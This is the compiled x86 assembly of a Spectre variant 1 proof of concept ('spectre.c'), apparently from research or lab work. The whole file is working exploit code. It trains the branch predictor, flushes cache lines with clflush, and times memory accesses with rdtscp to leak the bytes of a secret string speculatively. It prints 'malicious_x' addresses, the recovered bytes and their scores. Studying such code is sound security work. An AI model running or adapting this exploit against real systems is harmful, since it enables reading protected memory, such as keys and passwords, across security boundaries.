	.text
	.intel_syntax noprefix
	.file	"spectre.c"
	.globl	check                           # -- Begin function check
	.p2align	4, 0x90
	.type	check,@function
check:                                  # @check
	.cfi_startproc
# %bb.0:
	call	.L0$pb
	.cfi_adjust_cfa_offset 4
.L0$pb:
	pop	eax
	.cfi_adjust_cfa_offset -4
.Ltmp0:
	add	eax, offset _GLOBAL_OFFSET_TABLE_+(.Ltmp0-.L0$pb)
	mov	ecx, dword ptr [eax + array1_size@GOTOFF]
	xor	eax, eax
	cmp	ecx, dword ptr [esp + 4]
	seta	al
	ret
.Lfunc_end0:
	.size	check, .Lfunc_end0-check
	.cfi_endproc
                                        # -- End function
	.globl	victim_function                 # -- Begin function victim_function
	.p2align	4, 0x90
	.type	victim_function,@function
victim_function:                        # @victim_function
	.cfi_startproc
# %bb.0:
	push	esi
	.cfi_def_cfa_offset 8
	.cfi_offset esi, -8
	call	.L1$pb
	.cfi_adjust_cfa_offset 4
.L1$pb:
	pop	eax
	.cfi_adjust_cfa_offset -4
.Ltmp1:
	add	eax, offset _GLOBAL_OFFSET_TABLE_+(.Ltmp1-.L1$pb)
	mov	ecx, dword ptr [esp + 8]
	mov	edx, dword ptr [eax + array1_size@GOTOFF]
	xor	esi, esi
	cmp	edx, ecx
	cmova	esi, ecx
	movzx	ecx, byte ptr [eax + esi + array1@GOTOFF]
	shl	ecx, 9
	mov	cl, byte ptr [eax + ecx + array2@GOTOFF]
	and	byte ptr [eax + temp@GOTOFF], cl
	pop	esi
	.cfi_def_cfa_offset 4
	ret
.Lfunc_end1:
	.size	victim_function, .Lfunc_end1-victim_function
	.cfi_endproc
                                        # -- End function
	.globl	readMemoryByte                  # -- Begin function readMemoryByte
	.p2align	4, 0x90
	.type	readMemoryByte,@function
readMemoryByte:                         # @readMemoryByte
	.cfi_startproc
# %bb.0:
	push	ebp
	.cfi_def_cfa_offset 8
	push	ebx
	.cfi_def_cfa_offset 12
	push	edi
	.cfi_def_cfa_offset 16
	push	esi
	.cfi_def_cfa_offset 20
	sub	esp, 28
	.cfi_def_cfa_offset 48
	.cfi_offset esi, -20
	.cfi_offset edi, -16
	.cfi_offset ebx, -12
	.cfi_offset ebp, -8
	call	.L2$pb
	.cfi_adjust_cfa_offset 4
.L2$pb:
	pop	edi
	.cfi_adjust_cfa_offset -4
.Ltmp2:
	add	edi, offset _GLOBAL_OFFSET_TABLE_+(.Ltmp2-.L2$pb)
	sub	esp, 4
	.cfi_adjust_cfa_offset 4
	lea	eax, [edi + readMemoryByte.results@GOTOFF]
	mov	ebx, edi
	push	1024
	.cfi_adjust_cfa_offset 4
	push	0
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	call	memset@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	dword ptr [esp + 20], 0         # 4-byte Folded Spill
	mov	dword ptr [esp + 8], 999        # 4-byte Folded Spill
	.p2align	4, 0x90
.LBB2_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB2_2 Depth 2
                                        #     Child Loop BB2_4 Depth 2
                                        #       Child Loop BB2_30 Depth 3
                                        #     Child Loop BB2_7 Depth 2
                                        #     Child Loop BB2_13 Depth 2
	xor	eax, eax
	.p2align	4, 0x90
.LBB2_2:                                #   Parent Loop BB2_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	clflush	byte ptr [edi + eax + array2@GOTOFF]
	clflush	byte ptr [edi + eax + array2@GOTOFF+512]
	clflush	byte ptr [edi + eax + array2@GOTOFF+1024]
	clflush	byte ptr [edi + eax + array2@GOTOFF+1536]
	clflush	byte ptr [edi + eax + array2@GOTOFF+2048]
	clflush	byte ptr [edi + eax + array2@GOTOFF+2560]
	clflush	byte ptr [edi + eax + array2@GOTOFF+3072]
	clflush	byte ptr [edi + eax + array2@GOTOFF+3584]
	add	eax, 4096
	cmp	eax, 131072
	jne	.LBB2_2
# %bb.3:                                #   in Loop: Header=BB2_1 Depth=1
	mov	eax, dword ptr [esp + 8]        # 4-byte Reload
	cdq
	idiv	dword ptr [edi + array1_size@GOTOFF]
	mov	ebp, edx
	mov	dword ptr [esp + 12], edx       # 4-byte Spill
	xor	ebp, dword ptr [esp + 48]
	mov	esi, 29
	jmp	.LBB2_4
	.p2align	4, 0x90
.LBB2_5:                                #   in Loop: Header=BB2_4 Depth=2
	mov	eax, esi
	mov	ecx, -1431655765
	mul	ecx
	shr	edx
	and	edx, -2
	lea	eax, [edx + 2*edx]
	not	eax
	add	eax, esi
	mov	ecx, eax
	and	ecx, -65536
	shr	eax, 16
	or	eax, ecx
	and	eax, ebp
	xor	eax, dword ptr [esp + 12]       # 4-byte Folded Reload
	sub	esp, 12
	.cfi_adjust_cfa_offset 12
	mov	ebx, edi
	push	eax
	.cfi_adjust_cfa_offset 4
	call	victim_function
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	sub	esi, 1
	jb	.LBB2_6
.LBB2_4:                                #   Parent Loop BB2_1 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB2_30 Depth 3
	clflush	byte ptr [edi + array1_size@GOTOFF]
	mov	dword ptr [esp + 16], 0
	mov	eax, dword ptr [esp + 16]
	cmp	eax, 99
	jg	.LBB2_5
	.p2align	4, 0x90
.LBB2_30:                               #   Parent Loop BB2_1 Depth=1
                                        #     Parent Loop BB2_4 Depth=2
                                        # =>    This Inner Loop Header: Depth=3
	add	dword ptr [esp + 16], 1
	mov	eax, dword ptr [esp + 16]
	cmp	eax, 100
	jl	.LBB2_30
	jmp	.LBB2_5
	.p2align	4, 0x90
.LBB2_6:                                #   in Loop: Header=BB2_1 Depth=1
	mov	ebx, 13
	jmp	.LBB2_7
	.p2align	4, 0x90
.LBB2_11:                               #   in Loop: Header=BB2_7 Depth=2
	add	ebx, 167
	cmp	ebx, 42765
	je	.LBB2_12
.LBB2_7:                                #   Parent Loop BB2_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	mov	esi, ebx
	and	esi, 255
	je	.LBB2_11
# %bb.8:                                #   in Loop: Header=BB2_7 Depth=2
	mov	ebp, esi
	shl	ebp, 9
	rdtscp
	mov	dword ptr [esp + 24], eax       # 4-byte Spill
	mov	dword ptr [esp + 12], edx       # 4-byte Spill
	movzx	eax, byte ptr [edi + ebp + array2@GOTOFF]
	rdtscp
	mov	dword ptr [esp + 20], ecx       # 4-byte Spill
	sub	eax, dword ptr [esp + 24]       # 4-byte Folded Reload
	sbb	edx, dword ptr [esp + 12]       # 4-byte Folded Reload
	mov	ecx, 100
	cmp	ecx, eax
	mov	eax, 0
	sbb	eax, edx
	jb	.LBB2_11
# %bb.9:                                #   in Loop: Header=BB2_7 Depth=2
	mov	eax, dword ptr [esp + 8]        # 4-byte Reload
	cdq
	idiv	dword ptr [edi + array1_size@GOTOFF]
	cmp	bl, byte ptr [edi + edx + array1@GOTOFF]
	je	.LBB2_11
# %bb.10:                               #   in Loop: Header=BB2_7 Depth=2
	add	dword ptr [edi + 4*esi + readMemoryByte.results@GOTOFF], 1
	jmp	.LBB2_11
	.p2align	4, 0x90
.LBB2_12:                               #   in Loop: Header=BB2_1 Depth=1
	mov	eax, -1
	xor	edx, edx
	lea	esi, [edi + readMemoryByte.results@GOTOFF+4]
	mov	ecx, -1
	jmp	.LBB2_13
	.p2align	4, 0x90
.LBB2_20:                               #   in Loop: Header=BB2_13 Depth=2
	mov	ecx, eax
	mov	eax, ebx
.LBB2_25:                               #   in Loop: Header=BB2_13 Depth=2
	add	edx, 2
	add	esi, 8
	cmp	edx, 256
	je	.LBB2_26
.LBB2_13:                               #   Parent Loop BB2_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	test	eax, eax
	js	.LBB2_14
# %bb.15:                               #   in Loop: Header=BB2_13 Depth=2
	mov	ebx, dword ptr [esi - 4]
	cmp	ebx, dword ptr [edi + 4*eax + readMemoryByte.results@GOTOFF]
	jge	.LBB2_14
# %bb.16:                               #   in Loop: Header=BB2_13 Depth=2
	test	ecx, ecx
	js	.LBB2_18
# %bb.17:                               #   in Loop: Header=BB2_13 Depth=2
	cmp	ebx, dword ptr [edi + 4*ecx + readMemoryByte.results@GOTOFF]
	jl	.LBB2_19
.LBB2_18:                               #   in Loop: Header=BB2_13 Depth=2
	mov	ecx, edx
	jmp	.LBB2_19
	.p2align	4, 0x90
.LBB2_14:                               #   in Loop: Header=BB2_13 Depth=2
	mov	ecx, eax
	mov	eax, edx
.LBB2_19:                               #   in Loop: Header=BB2_13 Depth=2
	lea	ebx, [edx + 1]
	test	eax, eax
	js	.LBB2_20
# %bb.21:                               #   in Loop: Header=BB2_13 Depth=2
	mov	ebp, dword ptr [esi]
	cmp	ebp, dword ptr [edi + 4*eax + readMemoryByte.results@GOTOFF]
	jge	.LBB2_20
# %bb.22:                               #   in Loop: Header=BB2_13 Depth=2
	test	ecx, ecx
	js	.LBB2_24
# %bb.23:                               #   in Loop: Header=BB2_13 Depth=2
	cmp	ebp, dword ptr [edi + 4*ecx + readMemoryByte.results@GOTOFF]
	jl	.LBB2_25
.LBB2_24:                               #   in Loop: Header=BB2_13 Depth=2
	mov	ecx, ebx
	jmp	.LBB2_25
	.p2align	4, 0x90
.LBB2_26:                               #   in Loop: Header=BB2_1 Depth=1
	mov	edx, dword ptr [edi + 4*eax + readMemoryByte.results@GOTOFF]
	mov	esi, dword ptr [edi + 4*ecx + readMemoryByte.results@GOTOFF]
	lea	ebx, [esi + esi]
	add	ebx, 5
	cmp	edx, ebx
	jge	.LBB2_29
# %bb.27:                               #   in Loop: Header=BB2_1 Depth=1
	xor	edx, 2
	or	edx, esi
	je	.LBB2_29
# %bb.28:                               #   in Loop: Header=BB2_1 Depth=1
	mov	esi, dword ptr [esp + 8]        # 4-byte Reload
	lea	edx, [esi - 1]
	cmp	esi, 1
	mov	dword ptr [esp + 8], edx        # 4-byte Spill
	ja	.LBB2_1
.LBB2_29:
	mov	edx, dword ptr [esp + 20]       # 4-byte Reload
	xor	dword ptr [edi + readMemoryByte.results@GOTOFF], edx
	mov	esi, dword ptr [esp + 52]
	mov	byte ptr [esi], al
	mov	eax, dword ptr [edi + 4*eax + readMemoryByte.results@GOTOFF]
	mov	edx, dword ptr [esp + 56]
	mov	dword ptr [edx], eax
	mov	byte ptr [esi + 1], cl
	mov	eax, dword ptr [edi + 4*ecx + readMemoryByte.results@GOTOFF]
	mov	dword ptr [edx + 4], eax
	add	esp, 28
	.cfi_def_cfa_offset 20
	pop	esi
	.cfi_def_cfa_offset 16
	pop	edi
	.cfi_def_cfa_offset 12
	pop	ebx
	.cfi_def_cfa_offset 8
	pop	ebp
	.cfi_def_cfa_offset 4
	ret
.Lfunc_end2:
	.size	readMemoryByte, .Lfunc_end2-readMemoryByte
	.cfi_endproc
                                        # -- End function
	.globl	main                            # -- Begin function main
	.p2align	4, 0x90
	.type	main,@function
main:                                   # @main
	.cfi_startproc
# %bb.0:
	push	ebp
	.cfi_def_cfa_offset 8
	push	ebx
	.cfi_def_cfa_offset 12
	push	edi
	.cfi_def_cfa_offset 16
	push	esi
	.cfi_def_cfa_offset 20
	sub	esp, 60
	.cfi_def_cfa_offset 80
	.cfi_offset esi, -20
	.cfi_offset edi, -16
	.cfi_offset ebx, -12
	.cfi_offset ebp, -8
	call	.L3$pb
	.cfi_adjust_cfa_offset 4
.L3$pb:
	pop	ebx
	.cfi_adjust_cfa_offset -4
.Ltmp3:
	add	ebx, offset _GLOBAL_OFFSET_TABLE_+(.Ltmp3-.L3$pb)
	mov	esi, dword ptr [ebx + stdin@GOT]
	lea	eax, [ebx + check@GOTOFF]
	mov	dword ptr [esp + 44], eax       # 4-byte Spill
	lea	eax, [ebx + .L.str.13@GOTOFF]
	mov	dword ptr [esp + 40], eax       # 4-byte Spill
	lea	eax, [ebx + .L.str.1@GOTOFF]
	mov	dword ptr [esp + 36], eax       # 4-byte Spill
	lea	eax, [ebx + array1@GOTOFF]
	mov	dword ptr [esp + 24], eax       # 4-byte Spill
	lea	eax, [ebx + array2@GOTOFF]
	mov	dword ptr [esp + 32], eax       # 4-byte Spill
	lea	eax, [ebx + .L.str.2@GOTOFF]
	mov	dword ptr [esp + 28], eax       # 4-byte Spill
	mov	dword ptr [esp + 48], esi       # 4-byte Spill
	jmp	.LBB3_1
	.p2align	4, 0x90
.LBB3_12:                               #   in Loop: Header=BB3_1 Depth=1
	call	getpid@PLT
	xor	ecx, ecx
	mov	edx, dword ptr [esp + 44]       # 4-byte Reload
	add	edx, 33
	setb	cl
	push	eax
	.cfi_adjust_cfa_offset 4
	push	ecx
	.cfi_adjust_cfa_offset 4
	push	edx
	.cfi_adjust_cfa_offset 4
	push	dword ptr [esp + 52]            # 4-byte Folded Reload
	.cfi_adjust_cfa_offset 4
	call	printf@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
.LBB3_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB3_8 Depth 2
	sub	esp, 12
	.cfi_adjust_cfa_offset 12
	push	dword ptr [esi]
	.cfi_adjust_cfa_offset 4
	call	getc@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	shl	eax, 24
	cmp	eax, 167772160
	je	.LBB3_1
# %bb.2:                                #   in Loop: Header=BB3_1 Depth=1
	cmp	eax, 1761607680
	je	.LBB3_12
# %bb.3:                                #   in Loop: Header=BB3_1 Depth=1
	cmp	eax, 1912602624
	jne	.LBB3_13
# %bb.4:                                #   in Loop: Header=BB3_1 Depth=1
	mov	eax, dword ptr [ebx + secret@GOTOFF]
	sub	esp, 4
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	push	dword ptr [esp + 48]            # 4-byte Folded Reload
	.cfi_adjust_cfa_offset 4
	call	printf@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	eax, dword ptr [ebx + secret@GOTOFF]
	mov	ecx, eax
	sub	ecx, dword ptr [esp + 24]       # 4-byte Folded Reload
	mov	dword ptr [esp + 16], ecx
	sub	esp, 12
	.cfi_adjust_cfa_offset 12
	push	eax
	.cfi_adjust_cfa_offset 4
	call	strlen@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	esi, eax
	mov	dword ptr [esp + 12], eax
	sub	esp, 4
	.cfi_adjust_cfa_offset 4
	push	131072
	.cfi_adjust_cfa_offset 4
	push	1
	.cfi_adjust_cfa_offset 4
	push	dword ptr [esp + 44]            # 4-byte Folded Reload
	.cfi_adjust_cfa_offset 4
	call	memset@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	cmp	dword ptr [esp + 80], 3
	jne	.LBB3_6
# %bb.5:                                #   in Loop: Header=BB3_1 Depth=1
	sub	esp, 4
	.cfi_adjust_cfa_offset 4
	lea	eax, [esp + 20]
	push	eax
	.cfi_adjust_cfa_offset 4
	push	dword ptr [esp + 36]            # 4-byte Folded Reload
	.cfi_adjust_cfa_offset 4
	mov	esi, dword ptr [esp + 96]
	push	dword ptr [esi + 4]
	.cfi_adjust_cfa_offset 4
	call	__isoc99_sscanf@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	eax, dword ptr [esp + 24]       # 4-byte Reload
	sub	dword ptr [esp + 16], eax
	sub	esp, 4
	.cfi_adjust_cfa_offset 4
	lea	eax, [ebx + .L.str.3@GOTOFF]
	lea	ecx, [esp + 16]
	push	ecx
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	push	dword ptr [esi + 8]
	.cfi_adjust_cfa_offset 4
	call	__isoc99_sscanf@PLT
	add	esp, 12
	.cfi_adjust_cfa_offset -12
	lea	eax, [ebx + .L.str.4@GOTOFF]
	push	dword ptr [esp + 16]
	.cfi_adjust_cfa_offset 4
	push	dword ptr [esp + 24]
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	call	printf@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	esi, dword ptr [esp + 12]
.LBB3_6:                                #   in Loop: Header=BB3_1 Depth=1
	sub	esp, 8
	.cfi_adjust_cfa_offset 8
	lea	eax, [ebx + .L.str.5@GOTOFF]
	push	esi
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	call	printf@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	eax, dword ptr [esp + 12]
	lea	ecx, [eax - 1]
	mov	dword ptr [esp + 12], ecx
	test	eax, eax
	jle	.LBB3_11
# %bb.7:                                #   in Loop: Header=BB3_1 Depth=1
	xor	esi, esi
	jmp	.LBB3_8
	.p2align	4, 0x90
.LBB3_10:                               #   in Loop: Header=BB3_8 Depth=2
	sub	esp, 12
	.cfi_adjust_cfa_offset 12
	push	10
	.cfi_adjust_cfa_offset 4
	call	putchar@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	eax, dword ptr [esp + 12]
	lea	ecx, [eax - 1]
	mov	dword ptr [esp + 12], ecx
	add	esi, 1
	test	eax, eax
	jle	.LBB3_11
.LBB3_8:                                #   Parent Loop BB3_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	mov	eax, dword ptr [ebx + secret@GOTOFF]
	movsx	eax, byte ptr [eax + esi]
	sub	esp, 4
	.cfi_adjust_cfa_offset 4
	lea	ecx, [ebx + .L.str.6@GOTOFF]
	push	eax
	.cfi_adjust_cfa_offset 4
	push	dword ptr [esp + 24]
	.cfi_adjust_cfa_offset 4
	push	ecx
	.cfi_adjust_cfa_offset 4
	call	printf@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	eax, dword ptr [esp + 16]
	lea	ecx, [eax + 1]
	mov	dword ptr [esp + 16], ecx
	sub	esp, 4
	.cfi_adjust_cfa_offset 4
	lea	ecx, [esp + 56]
	push	ecx
	.cfi_adjust_cfa_offset 4
	lea	ecx, [esp + 30]
	push	ecx
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	call	readMemoryByte
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	mov	edi, dword ptr [esp + 52]
	mov	ebp, dword ptr [esp + 56]
	mov	eax, ebp
	add	eax, ebp
	cmp	edi, eax
	lea	eax, [ebx + .L.str.9@GOTOFF]
	lea	ecx, [ebx + .L.str.8@GOTOFF]
	cmovl	ecx, eax
	sub	esp, 8
	.cfi_adjust_cfa_offset 8
	lea	eax, [ebx + .L.str.7@GOTOFF]
	push	ecx
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	call	printf@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	movzx	eax, byte ptr [esp + 22]
	mov	ecx, eax
	add	cl, -32
	cmp	cl, 95
	mov	ecx, 63
	cmovb	ecx, eax
	lea	edx, [ebx + .L.str.10@GOTOFF]
	push	edi
	.cfi_adjust_cfa_offset 4
	push	ecx
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	push	edx
	.cfi_adjust_cfa_offset 4
	call	printf@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	test	ebp, ebp
	jle	.LBB3_10
# %bb.9:                                #   in Loop: Header=BB3_8 Depth=2
	movzx	eax, byte ptr [esp + 23]
	mov	ecx, eax
	add	cl, -32
	cmp	cl, 95
	mov	ecx, 63
	cmovb	ecx, eax
	lea	edx, [ebx + .L.str.11@GOTOFF]
	push	ebp
	.cfi_adjust_cfa_offset 4
	push	ecx
	.cfi_adjust_cfa_offset 4
	push	eax
	.cfi_adjust_cfa_offset 4
	push	edx
	.cfi_adjust_cfa_offset 4
	call	printf@PLT
	add	esp, 16
	.cfi_adjust_cfa_offset -16
	jmp	.LBB3_10
	.p2align	4, 0x90
.LBB3_11:                               #   in Loop: Header=BB3_1 Depth=1
	mov	esi, dword ptr [esp + 48]       # 4-byte Reload
	jmp	.LBB3_1
.LBB3_13:
	xor	eax, eax
	add	esp, 60
	.cfi_def_cfa_offset 20
	pop	esi
	.cfi_def_cfa_offset 16
	pop	edi
	.cfi_def_cfa_offset 12
	pop	ebx
	.cfi_def_cfa_offset 8
	pop	ebp
	.cfi_def_cfa_offset 4
	ret
.Lfunc_end3:
	.size	main, .Lfunc_end3-main
	.cfi_endproc
                                        # -- End function
	.type	array1_size,@object             # @array1_size
	.data
	.globl	array1_size
	.p2align	2
array1_size:
	.long	16                              # 0x10
	.size	array1_size, 4

	.type	array1,@object                  # @array1
	.globl	array1
array1:
	.ascii	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	144
	.size	array1, 160

	.type	.L.str,@object                  # @.str
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str:
	.asciz	"The Magic Words are Squeamish Ossifrage."
	.size	.L.str, 41

	.type	secret,@object                  # @secret
	.data
	.globl	secret
	.p2align	2
secret:
	.long	.L.str
	.size	secret, 4

	.type	temp,@object                    # @temp
	.bss
	.globl	temp
temp:
	.byte	0                               # 0x0
	.size	temp, 1

	.type	array2,@object                  # @array2
	.globl	array2
array2:
	.zero	131072
	.size	array2, 131072

	.type	readMemoryByte.results,@object  # @readMemoryByte.results
	.local	readMemoryByte.results
	.comm	readMemoryByte.results,1024,4
	.type	.L.str.1,@object                # @.str.1
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str.1:
	.asciz	"Putting '%s' in memory, address %p\n"
	.size	.L.str.1, 36

	.type	.L.str.2,@object                # @.str.2
.L.str.2:
	.asciz	"%p"
	.size	.L.str.2, 3

	.type	.L.str.3,@object                # @.str.3
.L.str.3:
	.asciz	"%d"
	.size	.L.str.3, 3

	.type	.L.str.4,@object                # @.str.4
.L.str.4:
	.asciz	"Trying malicious_x = %p, len = %d\n"
	.size	.L.str.4, 35

	.type	.L.str.5,@object                # @.str.5
.L.str.5:
	.asciz	"Reading %d bytes:\n"
	.size	.L.str.5, 19

	.type	.L.str.6,@object                # @.str.6
.L.str.6:
	.asciz	"Reading at malicious_x = %p secc= %c ..."
	.size	.L.str.6, 41

	.type	.L.str.7,@object                # @.str.7
.L.str.7:
	.asciz	"%s: "
	.size	.L.str.7, 5

	.type	.L.str.8,@object                # @.str.8
.L.str.8:
	.asciz	"Success"
	.size	.L.str.8, 8

	.type	.L.str.9,@object                # @.str.9
.L.str.9:
	.asciz	"Unclear"
	.size	.L.str.9, 8

	.type	.L.str.10,@object               # @.str.10
.L.str.10:
	.asciz	"0x%02X='%c' score=%d "
	.size	.L.str.10, 22

	.type	.L.str.11,@object               # @.str.11
.L.str.11:
	.asciz	"(second best: 0x%02X='%c' score=%d)"
	.size	.L.str.11, 36

	.type	.L.str.13,@object               # @.str.13
.L.str.13:
	.asciz	"addr = %llx, pid = %d\n"
	.size	.L.str.13, 23

	.type	unused1,@object                 # @unused1
	.bss
	.globl	unused1
unused1:
	.zero	64
	.size	unused1, 64

	.type	unused2,@object                 # @unused2
	.globl	unused2
unused2:
	.zero	64
	.size	unused2, 64

	.ident	"Ubuntu clang version 14.0.0-1ubuntu1.1"
	.section	".note.GNU-stack","",@progbits
	.addrsig
	.addrsig_sym check
	.addrsig_sym array1_size
	.addrsig_sym array1
	.addrsig_sym array2
